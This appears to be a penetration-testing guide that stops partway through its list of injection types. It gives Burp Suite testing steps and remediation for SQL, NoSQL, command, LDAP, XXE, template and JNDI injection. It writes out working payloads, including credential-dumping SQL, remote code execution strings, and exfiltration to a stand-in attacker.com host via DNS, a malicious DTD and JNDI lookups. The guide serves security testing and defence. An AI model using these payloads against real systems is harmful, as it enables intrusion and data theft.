# 🔥 **A03 INJECTION TESTING MASTER GUIDE FOR VAPT**
*A Professional Penetration Tester's Comprehensive Deep Dive into Injection Vulnerabilities*

---

## 📋 **TABLE OF CONTENTS**

| # | Injection Type |
|---|----------------|
| 1 | [SQL Injection (Classic) - Error-Based](#1-sql-injection-classic---error-based) |
| 2 | [SQL Injection (Union-Based)](#2-sql-injection-union-based) |
| 3 | [SQL Injection (Blind - Boolean)](#3-sql-injection-blind---boolean) |
| 4 | [SQL Injection (Blind - Time-Based)](#4-sql-injection-blind---time-based) |
| 5 | [SQL Injection (Second-Order)](#5-sql-injection-second-order) |
| 6 | [SQL Injection (Out-of-Band)](#6-sql-injection-out-of-band) |
| 7 | [NoSQL Injection (MongoDB)](#7-nosql-injection-mongodb) |
| 8 | [NoSQL Injection (Operator Injection)](#8-nosql-injection-operator-injection) |
| 9 | [Command Injection (OS)](#9-command-injection-os) |
| 10 | [Command Injection (Blind)](#10-command-injection-blind) |
| 11 | [LDAP Injection](#11-ldap-injection) |
| 12 | [XPath Injection](#12-xpath-injection) |
| 13 | [XML External Entity (XXE) Injection](#13-xml-external-entity-xxe-injection) |
| 14 | [XXE - Blind / OOB](#14-xxe---blind--oob) |
| 15 | [Server-Side Template Injection (SSTI)](#15-server-side-template-injection-ssti) |
| 16 | [Server-Side Template Injection (Blind)](#16-server-side-template-injection-blind) |
| 17 | [Expression Language (EL) Injection](#17-expression-language-el-injection) |
| 18 | [Java Naming and Directory Interface (JNDI) Injection](#18-java-naming-and-directory-interface-jndi-injection) |
| 19 | [Host Header Injection](#19-host-header-injection) |
| 20 | [HTTP Parameter Pollution (HPP)](#20-http-parameter-pollution-hpp) |
| 21 | [HTTP Response Splitting](#21-http-response-splitting) |
| 22 | [Email Header Injection (SMTP)](#22-email-header-injection-smtp) |
| 23 | [IMAP/SMTP Injection](#23-imapsmtp-injection) |
| 24 | [CRLF Injection](#24-crlf-injection) |
| 25 | [JSON Injection](#25-json-injection) |
| 26 | [YAML Injection](#26-yaml-injection) |
| 27 | [GraphQL Injection](#27-graphql-injection) |
| 28 | [GraphQL Batch Query Injection](#28-graphql-batch-query-injection) |
| 29 | [Mass Assignment / Parameter Injection](#29-mass-assignment--parameter-injection) |
| 30 | [Log Injection (Log4Shell / JNDI)](#30-log-injection-log4shell--jndi) |
| 31 | [Log Injection (Log Forging)](#31-log-injection-log-forging) |
| 32 | [SQLite Injection](#32-sqlite-injection) |
| 33 | [PostgreSQL Injection (Advanced)](#33-postgresql-injection-advanced) |
| 34 | [MySQL Injection (Advanced)](#34-mysql-injection-advanced) |
| 35 | [MSSQL Injection (Advanced)](#35-mssql-injection-advanced) |
| 36 | [Oracle SQL Injection](#36-oracle-sql-injection) |
| 37 | [ORM Injection (Hibernate, Doctrine)](#37-orm-injection-hibernate-doctrine) |
| 38 | [JPA Injection](#38-jpa-injection) |
| 39 | [Cassandra CQL Injection](#39-cassandra-cql-injection) |
| 40 | [Redis Injection](#40-redis-injection) |
| 41 | [XQuery Injection](#41-xquery-injection) |
| 42 | [MongoDB Query Injection](#42-mongodb-query-injection) |
| 43 | [CouchDB Injection](#43-couchdb-injection) |
| 44 | [Elasticsearch Injection](#44-elasticsearch-injection) |
| 45 | [GraphQL Query Injection](#45-graphql-query-injection) |
| 46 | [RestQL Injection](#46-restql-injection) |
| 47 | [Server-Side JavaScript Injection (Node.js)](#47-server-side-javascript-injection-nodejs) |
| 48 | [Server-Side Python Injection](#48-server-side-python-injection) |
| 49 | [Server-Side PHP Injection](#49-server-side-php-injection) |
| 50 | [Server-Side Ruby Injection](#50-server-side-ruby-injection) |
| 51 | [Server-Side .NET Injection](#51-server-side-net-injection) |
| 52 | [Expression Language Injection (Spring)](#52-expression-language-injection-spring) |
| 53 | [Velocity Template Injection](#53-velocity-template-injection) |
| 54 | [FreeMarker Template Injection](#54-freemarker-template-injection) |
| 55 | [Jinja2 Template Injection](#55-jinja2-template-injection) |
| 56 | [Twig Template Injection](#56-twig-template-injection) |
| 57 | [Smarty Template Injection](#57-smarty-template-injection) |
| 58 | [Vue.js Template Injection (Client-Side)](#58-vuejs-template-injection-client-side) |
| 59 | [Angular Template Injection](#59-angular-template-injection) |
| 60 | [JavaScript Injection (Client-Side)](#60-javascript-injection-client-side) |
| 61 | [CSS Injection](#61-css-injection) |
| 62 | [HTML Injection](#62-html-injection) |
| 63 | [SVG Injection](#63-svg-injection) |
| 64 | [Markdown Injection](#64-markdown-injection) |
| 65 | [CSV Injection](#65-csv-injection) |
| 66 | [Formula Injection (Excel)](#66-formula-injection-excel) |
| 67 | [LDAP (Bind) Injection](#67-ldap-bind-injection) |
| 68 | [XPATH Injection (Blind)](#68-xpath-injection-blind) |
| 69 | [SQL Injection (Stored Procedure)](#69-sql-injection-stored-procedure) |
| 70 | [SQL Injection (WAF Evasion)](#70-sql-injection-waf-evasion) |

---

## 1. SQL INJECTION (CLASSIC) - ERROR-BASED

**Description**  
SQL injection occurs when user input is unsafely concatenated into SQL queries. Attackers can inject malicious SQL syntax to alter the query's logic, retrieve sensitive data, or modify the database. Error‑based injection leverages database error messages to extract information.

**What to Look For**
- Input fields that are used in database queries (search, login, filters)
- URLs with parameters like `?id=123`, `?name=test`
- Error messages from the database (SQL syntax errors, type mismatches)
- Applications that reflect database errors to the client

**What to Ignore**
- Parameterized queries (prepared statements) with proper input handling
- Error messages suppressed in production

**How to Test with Burp Suite**
1. **Identify Potential Injection Points** – all parameters, headers, cookies
2. **Inject a single quote (`'`) and observe response** – if error appears, likely vulnerable
3. **Send payloads to Burp Repeater** for manual testing
4. **Use Intruder with a SQL injection wordlist** to detect error patterns
5. **Automate with SQLMap** (point to the vulnerable parameter)

**Example**
```http
GET /product?id=123' HTTP/1.1
```
Response error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
```
Then use payload:
```sql
123' UNION SELECT username, password FROM users--
```

**Tools**
- Burp Suite (Repeater, Intruder)
- SQLMap
- OWASP ZAP

**Risk Rating**  
Critical

**Remediation**
- Use parameterized queries (prepared statements)
- Use stored procedures with parameterization
- Escape user input properly
- Apply the principle of least privilege to database accounts

---

## 2. SQL INJECTION (UNION-BASED)

**Description**  
Union-based SQL injection uses the `UNION` operator to combine the original query with a malicious query, allowing extraction of data from other tables. Attackers need to match the number and data types of columns.

**What to Look For**
- The same as error‑based injection, but error messages may be suppressed.
- Ability to use `ORDER BY` to determine column count.

**How to Test with Burp Suite**
1. **Determine number of columns** using `ORDER BY n` (increase until error)
   ```
   ' ORDER BY 1-- 
   ' ORDER BY 2-- 
   ```
2. **Find columns with matching data types** using `UNION SELECT NULL,NULL,...`
3. **Extract data** using `UNION SELECT user, password FROM users--`
4. Use Burp Repeater to manually craft payloads, or let SQLMap automate.

**Example**
```sql
' UNION SELECT null, username, password FROM users--
```

**Tools**
- SQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Same as error‑based SQLi (parameterized queries, stored procedures, input validation)

---

## 3. SQL INJECTION (BLIND - BOOLEAN)

**Description**  
Blind Boolean injection uses true/false conditions to infer data bit by bit, without visible database errors or data in the response.

**What to Look For**
- Application behavior changes based on whether a condition is true (e.g., page content, redirects, status codes)
- No direct error messages or data output

**How to Test with Burp Suite**
1. Inject a condition that is always true, e.g., `' AND 1=1--`
2. Compare response with condition always false: `' AND 1=2--`
3. If responses differ, the parameter is vulnerable.
4. Use `AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'` to extract data.
5. Automate with SQLMap using `--technique=B`.

**Example**
```http
GET /user?id=1' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')='1'--
```

**Tools**
- SQLMap
- Burp Intruder with payloads
- Custom scripts (e.g., using `time` module for timing)

**Risk Rating**  
High

**Remediation**
- Parameterized queries
- Proper error handling to avoid revealing differences

---

## 4. SQL INJECTION (BLIND - TIME-BASED)

**Description**  
Time‑based blind injection uses delays (e.g., `SLEEP()`, `WAITFOR DELAY`) to infer truth values when no visible difference is present.

**What to Look For**
- Application responds after a delay only when condition is true.
- Use of `SLEEP` or `BENCHMARK` functions.

**How to Test with Burp Suite**
1. Inject `' AND SLEEP(5)--` (MySQL) or `' WAITFOR DELAY '00:00:05'--` (MSSQL)
2. Measure response time in Repeater (or use Turbo Intruder for precision).
3. If response takes ~5 seconds longer, parameter is vulnerable.
4. Combine with conditional logic to extract data.

**Example**
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

**Tools**
- Burp Repeater (manual timing)
- SQLMap
- Custom scripts with timing measurement

**Risk Rating**  
High

**Remediation**
- Same as Boolean blind; also ensure database functions like `SLEEP` are not available to unprivileged users

---

## 5. SQL INJECTION (SECOND-ORDER)

**Description**  
Second‑order injection occurs when user input is stored in the database (e.g., registration) and later used in a vulnerable SQL query without proper sanitization.

**What to Look For**
- Input that is stored (profile fields, comments, usernames) and later used in queries (e.g., `WHERE username = '$stored_username'`)
- No immediate feedback when storing, but later actions (e.g., admin viewing user list) cause injection.

**How to Test with Burp Suite**
1. Register a user with a payload in a field that will be used in a later query, e.g., username = `test' OR '1'='1`
2. Perform an action that uses that stored data (e.g., change password, view profile, admin list).
3. Observe if injection triggers errors or behavior changes.

**Example**
```sql
-- Registration payload
username = `admin' -- `
-- Later, a query like:
SELECT * FROM users WHERE username = 'admin' -- '
```

**Tools**
- Burp Suite (manual multi-step testing)
- Custom scripts to simulate the workflow

**Risk Rating**  
High

**Remediation**
- Use parameterized queries for all queries, including those involving stored data
- Validate and escape stored data before use

---

## 6. SQL INJECTION (OUT-OF-BAND)

**Description**  
Out‑of‑band injection uses DNS or HTTP requests to exfiltrate data when direct output is not possible. Common with Oracle, MSSQL, and MySQL.

**What to Look For**
- Functions like `UTL_HTTP.request`, `xp_cmdshell`, `LOAD_FILE`, etc.
- Ability to make network requests from the database server.

**How to Test with Burp Suite**
1. Inject payloads that trigger a DNS lookup or HTTP request to an attacker‑controlled server.
2. Monitor DNS logs for incoming requests.
3. Example (MySQL): `' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))`
4. Example (MSSQL): `'; exec master..xp_cmdshell 'nslookup attacker.com'--`

**Tools**
- Burp Collaborator (built-in for out‑of‑band testing)
- DNS/HTTP server for custom domains

**Risk Rating**  
Critical

**Remediation**
- Disable dangerous functions (`xp_cmdshell`, `UTL_HTTP`, etc.)
- Use least privilege database accounts
- Network segmentation to prevent outbound requests

---

## 7. NOSQL INJECTION (MONGODB)

**Description**  
NoSQL databases (like MongoDB) use query languages that can be manipulated with JSON/operator injection. Attackers can bypass authentication, extract data, or execute arbitrary code.

**What to Look For**
- JSON‑based APIs or parameters passed as JSON
- Usage of operators like `$ne`, `$gt`, `$regex`, `$where`

**How to Test with Burp Suite**
1. In a login form, send:
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
   ```
2. If login succeeds, authentication is bypassed.
3. For extraction, use `$regex` to brute‑force characters.

**Example**
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Tools**
- Burp Repeater
- NoSQLMap
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Validate and sanitize user input (type checking)
- Use parameterized queries if available
- Restrict the use of operators to safe fields

---

## 8. NOSQL INJECTION (OPERATOR INJECTION)

**Description**  
This covers injection into NoSQL query languages beyond MongoDB, such as CouchDB, Cassandra, or Elasticsearch, using operators to alter query logic.

**What to Look For**
- Usage of special characters like `$`, `{`, `}` in parameters
- Applications that parse user input into NoSQL queries without validation

**How to Test with Burp Suite**
1. For CouchDB, try `?key={"$gt": ""}` to retrieve all documents.
2. For Elasticsearch, try `?q=*:*` to return all records.
3. Observe if the query returns more data than intended.

**Tools**
- Burp Repeater
- NoSQLMap (supports multiple NoSQL databases)
- Manual payloads

**Risk Rating**  
High

**Remediation**
- Escape special characters
- Use parameterized queries with safe binding
- Validate user input type and structure

---

## 9. COMMAND INJECTION (OS)

**Description**  
Command injection occurs when user input is passed to a system shell, allowing attackers to execute arbitrary operating system commands.

**What to Look For**
- Input used in system calls (e.g., `exec()`, `system()`, `shell_exec()`, `Runtime.exec()`)
- File operations, ping, nslookup, traceroute, etc.

**How to Test with Burp Suite**
1. Inject typical command separators: `;`, `|`, `&&`, `||`, `$()`, ```` (backticks)
2. Try a safe command like `; whoami` and observe response (if command output is reflected)
3. For blind injection, use `; ping -c 10 attacker.com` and monitor for ICMP packets.

**Example**
```http
GET /ping?ip=127.0.0.1; whoami HTTP/1.1
```
If response contains the username, command injection is confirmed.

**Tools**
- Burp Repeater
- Commix
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Avoid calling shell from application code
- If necessary, use whitelist of allowed commands and parameters
- Use language‑specific functions that avoid shell invocation (e.g., `subprocess` with list in Python)

---

## 10. COMMAND INJECTION (BLIND)

**Description**  
Blind command injection occurs when command output is not returned, but the attacker can infer execution via side effects (time delays, file creation, out‑of‑band requests).

**What to Look For**
- Delays when injecting `sleep` commands (`; sleep 5`)
- Out‑of‑band DNS/HTTP requests (`; nslookup attacker.com`)

**How to Test with Burp Suite**
1. Inject `; sleep 5` and measure response time.
2. Use Burp Collaborator to detect DNS requests: `; nslookup collaborator.burp`
3. Create a file in the webroot: `; echo vulnerable > /var/www/html/test.txt` and then request `/test.txt`.

**Tools**
- Burp Collaborator
- Custom timing measurements
- Commix (blind mode)

**Risk Rating**  
Critical

**Remediation**
- Same as OS command injection; avoid shell calls altogether.

---

## 11. LDAP INJECTION

**Description**  
LDAP injection occurs when user input is used to construct LDAP filters without proper escaping, allowing attackers to modify the filter logic and potentially bypass authentication or extract data.

**What to Look For**
- Login or search forms that may query an LDAP directory
- Usage of `(&(uid={input})(userPassword={input}))`

**How to Test with Burp Suite**
1. In a login field, inject `*` to see if it returns all users.
2. Use `)(|(uid=*` to close the original filter and add an OR condition.
3. Example payload: `admin)(|(uid=*` → filter becomes `(&(uid=admin)(|(uid=*)(userPassword=...))`, which may always succeed.

**Tools**
- Burp Repeater
- ldapsearch for manual testing (if accessible)
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Escape special LDAP characters (`*`, `(`, `)`, `\`, `/`)
- Use parameterized LDAP queries with libraries that handle escaping

---

## 12. XPATH INJECTION

**Description**  
XPATH injection occurs when user input is used to construct XPath queries, allowing attackers to bypass authentication or extract XML data.

**What to Look For**
- XML-based data storage or API
- Input used in XPath expressions, e.g., `//user[username='{input}']`

**How to Test with Burp Suite**
1. Inject `' or '1'='1` to bypass authentication.
2. Use `' or '1'='1` or `']|//*|//*['` to retrieve all nodes.
3. Use `' or 1=1]|//*|//*['` to cause a union-like effect.

**Example**
```xpath
//user[username='admin' or '1'='1']
```

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Use parameterized XPath queries (with variables)
- Escape special characters (`'`, `"`, `[`, `]`, `@`, `/`, `*`)

---

## 13. XML EXTERNAL ENTITY (XXE) INJECTION

**Description**  
XXE attacks exploit XML parsers that process external entities, allowing attackers to read local files, perform SSRF, or cause denial of service.

**What to Look For**
- Endpoints that accept XML input (e.g., SOAP APIs, XML uploads)
- Content-Type: `application/xml` or `text/xml`

**How to Test with Burp Suite**
1. Send a simple XML with a DOCTYPE that defines an external entity:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>
   ```
2. If response includes `/etc/passwd`, XXE is present.
3. For blind XXE, use OOB with HTTP requests to Burp Collaborator.

**Tools**
- Burp Repeater
- Burp Collaborator
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Disable external entity processing in XML parsers
- Use less complex data formats (e.g., JSON) when possible
- Update XML libraries to latest versions

---

## 14. XXE - BLIND / OOB

**Description**  
Blind XXE occurs when the XML parser does not return the entity content directly, but can be exploited using out‑of‑band techniques (e.g., HTTP requests) to exfiltrate data.

**What to Look For**
- Same as XXE but no file content in response

**How to Test with Burp Suite**
1. Inject a parameter entity pointing to an external DTD that you control:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
     %xxe;
   ]>
   ```
2. On your server, `evil.dtd` contains:
   ```xml
   <!ENTITY % data SYSTEM "file:///etc/passwd">
   <!ENTITY % param1 "<!ENTITY &exfil; SYSTEM 'http://attacker.com/?data=%data;'>">
   %param1;
   ```
3. The parser makes a request to your server with the file content.

**Tools**
- Burp Collaborator
- Custom HTTP server

**Risk Rating**  
Critical

**Remediation**
- Disable external entity processing
- Use secure XML parser configurations

---

## 15. SERVER-SIDE TEMPLATE INJECTION (SSTI)

**Description**  
SSTI occurs when user input is concatenated into a server‑side template (e.g., Jinja2, Twig, Freemarker) without proper sanitization, allowing attackers to execute code on the server.

**What to Look For**
- Applications using template engines (e.g., `/search?q={{7*7}}` returns `49`)
- Input fields that are rendered as part of templates

**How to Test with Burp Suite**
1. Inject template syntax: `{{7*7}}`, `${{7*7}}`, `#{7*7}`, etc.
2. If the output is `49`, the engine evaluates the expression.
3. Use payloads to execute code: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

**Tools**
- Burp Repeater
- Tplmap (for automated SSTI exploitation)

**Risk Rating**  
Critical

**Remediation**
- Never concatenate user input into templates
- Use sandboxed template engines with restricted functionality
- Prefer rendering static data or using safe output methods

---

## 16. SERVER-SIDE TEMPLATE INJECTION (BLIND)

**Description**  
Blind SSTI occurs when template evaluation does not produce visible output, but can be inferred through side effects (e.g., errors, delays, network requests).

**What to Look For**
- Same as SSTI but no immediate output

**How to Test with Burp Suite**
1. Inject payloads that cause delays, e.g., `{{7*'7'}}` in Jinja2 may cause error.
2. Use out‑of‑band techniques (e.g., `{{config.__class__.__init__.__globals__['os'].popen('nslookup collaborator.burp')}}`).
3. Monitor for DNS requests.

**Tools**
- Burp Collaborator
- Tplmap (supports blind)

**Risk Rating**  
Critical

**Remediation**
- Same as SSTI

---

## 17. EXPRESSION LANGUAGE (EL) INJECTION

**Description**  
Expression Language injection occurs in Java applications using EL, often in legacy JSPs or frameworks that evaluate user input as EL expressions.

**What to Look For**
- Parameters that are evaluated in EL context
- Use of `${}` or `#{}` syntax

**How to Test with Burp Suite**
1. Inject `${7*7}`; if output is `49`, EL injection exists.
2. Try to execute code: `${Runtime.getRuntime().exec('calc')}`

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Disable EL evaluation for user input
- Use proper escaping

---

## 18. JAVA NAMING AND DIRECTORY INTERFACE (JNDI) INJECTION

**Description**  
JNDI injection allows attackers to load remote classes via LDAP/RMI, leading to remote code execution. This is a core vulnerability behind Log4Shell.

**What to Look For**
- Applications using JNDI lookups with user-controlled input (e.g., logging libraries)
- Log messages containing `${jndi:ldap://attacker.com/a}`

**How to Test with Burp Suite**
1. Inject `${jndi:ldap://attacker.com/evil}` in any field that may be logged.
2. If the attacker receives a connection, the application is vulnerable.

**Tools**
- Burp Collaborator
- Custom LDAP/RMI server

**Risk Rating**  
Critical

**Remediation**
- Disable JNDI lookups in logging frameworks
- Update libraries (Log4j 2.17+)
- Set system property `log4j2.formatMsgNoLookups=true`

---

## 19. HOST HEADER INJECTION

**Description**  
Host header injection occurs when the application uses the `Host` header to generate links or perform actions, allowing attackers to manipulate it for password reset poisoning or cache poisoning.

**What to Look For**
- Links in emails or responses that use the `Host` header
- Password reset functionality that constructs URLs based on `Host`

**How to Test with Burp Suite**
1. Intercept a request and change the `Host` header to an attacker‑controlled domain.
2. If the application generates a link using that domain (e.g., password reset email), it's vulnerable.

**Tools**
- Burp Repeater
- Manual observation

**Risk Rating**  
High

**Remediation**
- Use a whitelist of allowed hosts
- Do not rely on `Host` header for critical URLs; use server‑side configuration

---

## 20. HTTP PARAMETER POLLUTION (HPP)

**Description**  
HPP occurs when an application processes multiple parameters with the same name in unexpected ways, leading to security bypasses or injection.

**What to Look For**
- Duplicate parameters in URLs or POST bodies
- Differences in how the front‑end and back‑end handle duplicates

**How to Test with Burp Suite**
1. Send a request with duplicate parameters, e.g., `?id=1&id=2`.
2. Observe which value is used (first, last, or combined).
3. Try to bypass authentication by injecting a privileged parameter.

**Tools**
- Burp Repeater
- Param Miner

**Risk Rating**  
Medium

**Remediation**
- Standardize parameter handling across components
- Reject requests with duplicate parameters if not expected

---

## 21. HTTP RESPONSE SPLITTING

**Description**  
Response splitting occurs when user input is reflected in HTTP headers without proper encoding, allowing attackers to inject new headers or split the response.

**What to Look For**
- Input reflected in `Location`, `Set-Cookie`, or any header
- Use of CRLF (`%0d%0a`) sequences

**How to Test with Burp Suite**
1. Inject `%0d%0a` followed by a new header, e.g., `?redirect=%0d%0aSet-Cookie:%20evil=1`
2. If the new header appears in the response, the application is vulnerable.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Encode CRLF characters in header values
- Use header‑safe APIs (e.g., `setHeader` in servlets)

---

## 22. EMAIL HEADER INJECTION (SMTP)

**Description**  
Email header injection occurs when user input is inserted into email headers without sanitization, allowing attackers to add arbitrary headers or modify the message.

**What to Look For**
- Contact forms, feedback forms that send emails
- Input fields for email subject, recipient, etc.

**How to Test with Burp Suite**
1. Inject `%0d%0a` followed by a header, e.g., `subject=Test%0d%0aBcc: attacker@evil.com`
2. If the email includes the new header, injection is possible.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Validate and sanitize input (remove CR/LF)
- Use safe email libraries that handle headers securely

---

## 23. IMAP/SMTP INJECTION

**Description**  
Similar to email header injection, but targets IMAP/SMTP commands in mail server protocols. Attackers can inject commands to manipulate mailboxes.

**What to Look For**
- Applications that interact directly with mail servers via IMAP/SMTP commands
- Input used in commands like `SEARCH`, `FETCH`

**How to Test with Burp Suite**
1. Inject `\r\n` followed by a new command.
2. For IMAP: `uid fetch 1 body[text]` → could be altered.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
High

**Remediation**
- Escape special characters (CR, LF)
- Use libraries that abstract IMAP/SMTP commands

---

## 24. CRLF INJECTION

**Description**  
CRLF injection is a subset of response splitting, allowing attackers to inject newlines into logs or HTTP responses, potentially leading to log forgery or session fixation.

**What to Look For**
- Input reflected in logs or HTTP headers
- Use of `%0d%0a` sequences

**How to Test with Burp Suite**
1. Inject `%0d%0a` followed by a new log line.
2. If the log shows an extra line, CRLF injection is present.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Medium

**Remediation**
- Encode or reject CRLF characters in user input
- Use logging frameworks that automatically escape

---

## 25. JSON INJECTION

**Description**  
JSON injection occurs when user input is inserted into JSON data without proper escaping, allowing attackers to break out of strings or modify the JSON structure.

**What to Look For**
- APIs that accept JSON input and reflect user data in JSON responses
- Input that may be placed into JSON strings

**How to Test with Burp Suite**
1. Inject `\"` or `\n` to break string context.
2. Try to add new JSON keys, e.g., `{"name":"test", "isAdmin":true}`.
3. If the server includes the extra key, injection is possible.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Medium

**Remediation**
- Use JSON serialization libraries (e.g., `json_encode`) that handle escaping
- Validate and sanitize input

---

## 26. YAML INJECTION

**Description**  
YAML injection occurs when user input is deserialized into YAML without proper sanitization, allowing attackers to execute arbitrary code (e.g., through `!!python/object`).

**What to Look For**
- Applications that accept YAML input (e.g., configuration uploads)
- Use of unsafe YAML parsers (like `PyYAML` with `load()`)

**How to Test with Burp Suite**
1. Send a YAML payload with a constructor:
   ```yaml
   !!python/object/new:os.system ["id"]
   ```
2. If the command executes, YAML injection is present.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Critical

**Remediation**
- Use safe YAML parsers (e.g., `yaml.safe_load` in Python)
- Avoid deserializing untrusted YAML

---

## 27. GRAPHQL INJECTION

**Description**  
GraphQL injection includes SQLi via GraphQL arguments or schema introspection abuse. Attackers can inject GraphQL syntax to manipulate queries or retrieve hidden data.

**What to Look For**
- GraphQL endpoints (`/graphql`, `/graphiql`)
- Arguments that are passed directly to databases

**How to Test with Burp Suite**
1. In a GraphQL query, inject SQL payloads in arguments: `{ user(id: "1' OR '1'='1") { name } }`
2. If the application returns data from multiple users, SQLi is present.

**Tools**
- Burp Repeater
- GraphQL Raider (Burp extension)
- InQL Scanner

**Risk Rating**  
High

**Remediation**
- Use parameterized queries in GraphQL resolvers
- Validate and sanitize arguments

---

## 28. GRAPHQL BATCH QUERY INJECTION

**Description**  
Attackers can send multiple GraphQL queries in a single request (batch queries) to cause excessive resource consumption or bypass rate limits.

**What to Look For**
- Support for batch queries (array of queries)
- Ability to include many deep queries

**How to Test with Burp Suite**
1. Send a batch request with 100 copies of a heavy query.
2. Observe if the server crashes or performance degrades.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Medium

**Remediation**
- Limit batch size and query depth
- Implement cost analysis

---

## 29. MASS ASSIGNMENT / PARAMETER INJECTION

**Description**  
Mass assignment occurs when an attacker adds extra parameters to a request that are automatically bound to internal object properties, allowing modification of unintended fields (e.g., `role`).

**What to Look For**
- APIs that use frameworks like Rails, Laravel, or Spring with auto‑binding
- Parameters like `role`, `is_admin` not present in the original form

**How to Test with Burp Suite**
1. Add an extra parameter to a POST request, e.g., `&role=admin`.
2. If the user becomes admin, mass assignment is possible.

**Tools**
- Burp Repeater
- Param Miner

**Risk Rating**  
Critical

**Remediation**
- Explicitly define which parameters can be mass‑assigned (whitelist)
- Use form requests with validation

---

## 30. LOG INJECTION (LOG4SHELL / JNDI)

**Description**  
Log4Shell is a critical vulnerability in Log4j where an attacker can cause remote code execution by injecting a JNDI lookup string into logs.

**What to Look For**
- Applications using Log4j versions 2.0–2.14.1
- Any user input that gets logged

**How to Test with Burp Suite**
1. Inject `${jndi:ldap://attacker.com/evil}` in any input field (User-Agent, username, etc.).
2. If the attacker receives a connection, the application is vulnerable.

**Tools**
- Burp Collaborator
- Custom LDAP server

**Risk Rating**  
Critical

**Remediation**
- Update Log4j to version 2.17+
- Set `log4j2.formatMsgNoLookups=true`
- Remove the JndiLookup class from the classpath

---

## 31. LOG INJECTION (LOG FORGING)

**Description**  
Log forging occurs when an attacker injects newlines into log entries, potentially adding fake log lines to mislead investigators or hide malicious activity.

**What to Look For**
- User input reflected in log files
- CRLF characters not sanitized

**How to Test with Burp Suite**
1. Inject `%0d%0a` followed by a fake log line.
2. If the fake line appears in the logs, log forging is possible.

**Tools**
- Burp Repeater
- Custom scripts

**Risk Rating**  
Medium

**Remediation**
- Encode CRLF characters in logged data
- Use structured logging with proper escaping

---

## 32. SQLITE INJECTION

**Description**  
SQLite injection is similar to classic SQLi but uses SQLite‑specific syntax and functions.

**What to Look For**
- Applications using SQLite database
- Error messages containing `SQLite` or `sqlite3`

**How to Test with Burp Suite**
1. Use classic payloads: `' OR 1=1--`
2. For blind, use `' AND SLEEP(5)--` (but SQLite doesn't have SLEEP; use `' AND 1=1` and `' AND 1=2` for Boolean).

**Tools**
- SQLMap (supports SQLite)
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Parameterized queries (SQLite supports prepared statements)
- Input validation

---

## 33. POSTGRESQL INJECTION (ADVANCED)

**Description**  
PostgreSQL injection includes advanced techniques like COPY, large objects, and PL/pgSQL execution.

**What to Look For**
- PostgreSQL error messages
- Ability to execute multiple statements

**How to Test with Burp Suite**
1. Use `; SELECT pg_sleep(5);` for time‑based.
2. Use `' AND 1=1::int--` for type conversion.
3. For RCE: `; COPY (SELECT '') TO PROGRAM 'id'` (if superuser).

**Tools**
- SQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Parameterized queries
- Least privilege database accounts

---

## 34. MYSQL INJECTION (ADVANCED)

**Description**  
Advanced MySQL injection includes union-based, file read/write, and out‑of‑band via DNS.

**What to Look For**
- MySQL error messages
- Ability to use `LOAD_FILE`, `INTO OUTFILE`

**How to Test with Burp Suite**
1. Union-based: `' UNION SELECT 1,2,3--`
2. File read: `' UNION SELECT LOAD_FILE('/etc/passwd')--`
3. Time-based: `' AND SLEEP(5)--`

**Tools**
- SQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Parameterized queries
- Disable `LOAD_FILE` and `INTO OUTFILE` for web users

---

## 35. MSSQL INJECTION (ADVANCED)

**Description**  
MSSQL injection includes features like `xp_cmdshell`, openrowset, and stack queries.

**What to Look For**
- SQL Server error messages
- Ability to execute `xp_cmdshell`

**How to Test with Burp Suite**
1. Execute command: `'; EXEC xp_cmdshell 'whoami';--`
2. Time-based: `' WAITFOR DELAY '00:00:05';--`

**Tools**
- SQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Disable `xp_cmdshell`
- Use parameterized queries

---

## 36. ORACLE SQL INJECTION

**Description**  
Oracle SQL injection uses PL/SQL functions and syntax.

**What to Look For**
- Oracle error messages (ORA-xxxxx)

**How to Test with Burp Suite**
1. Time-based: `' AND 1=(SELECT 1 FROM DUAL WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--`
2. Union: `' UNION SELECT username, password FROM users--`

**Tools**
- SQLMap
- Burp Repeater

**Risk Rating**  
Critical

**Remediation**
- Parameterized queries
- Use least privilege accounts

---

## 37. ORM INJECTION (HIBERNATE, DOCTRINE)

**Description**  
ORM injection occurs when object‑relational mapping frameworks build queries from unsanitized user input, leading to SQL injection.

**What to Look For**
- Hibernate or Doctrine usage
- Dynamic HQL/JPQL queries with concatenation

**How to Test with Burp Suite**
1. Inject SQL‑like syntax into HQL parameters: `' or 1=1--`
2. If the query returns unintended results, ORM injection exists.

**Tools**
- Burp Repeater
- Manual testing

